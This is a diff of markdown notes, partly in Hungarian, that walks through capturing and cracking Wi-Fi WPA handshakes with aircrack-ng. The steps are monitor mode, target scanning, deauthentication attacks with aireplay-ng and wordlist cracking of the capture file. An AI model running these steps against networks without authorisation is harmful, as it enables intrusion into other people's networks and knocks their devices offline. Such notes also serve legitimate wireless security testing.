@@ -14,21 +14,28 @@ sudo airmon-ng start wlp6s0
 
 ### STOP
 
+```
 sudo airmon-ng stop wlp6s0mon
-
+```
 
 # MONITORING:
 
 ### Show: wlp6s0mon or your network interface...
 
-	iwconfig
+```
+iwconfig
+```
 
 ### Search Target mac adresses, pl: AA:BB:CC:DD:EE:FF
 
-	sudo airodump-ng wlp6s0mon
+```
+sudo airodump-ng wlp6s0mon
+```
 
 # RESULT OF MONITORING:
-# Choose your target
+
+### Choose your target
+```
 	 CH 14 ][ Elapsed: 54 s ][ 2020-08-12 19:18 
 
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
@@ -46,7 +53,7 @@ sudo airmon-ng stop wlp6s0mon
  12:12:12:12:12:12  50:50:50:50:50:50  -46    0 - 0e     0        6                  
  33:33:33:33:33:33  22:22:22:22:22:22  -70    0e- 0e     0      440                  
  77:77:77:77:77:77  E8:E8:E8:E8:E8:E8   -1    1e- 0      0        1             
-
+```
 
 # TYPE YOUR TARGET BSSID, Channel (CH), and the capture file
 ## monitoring the router for a long time
@@ -67,12 +74,14 @@ sudo aireplay-ng -0 4 -a AA:BB:CC:DD:EE:FF wlp6s0mon
 	# ADD WORDLIST AND TRY TO AUTHENTICATE
 
 ```
-	sudo aircrack-ng ./test-01.cap -w ./wordlists/wordlist.txt
+sudo aircrack-ng ./test-01.cap -w ./wordlists/wordlist.txt
 ```
 
-	# Tipikus hibaüzenet: 
-	# Ez azért van, mert nem sikerült kellő adatot rögzíteni a .cap fájlba
-	Packets contained no EAPOL data; unable to process this AP.
+### Tipikus hibaüzenet: 
+> Ez azért van, mert nem sikerült kellő adatot rögzíteni a .cap fájlba
+```
+Packets contained no EAPOL data; unable to process this AP.
+```
 
 ## 2. Use BSSID (mac) and STATION (mac) address, and give combination of letters and number
 
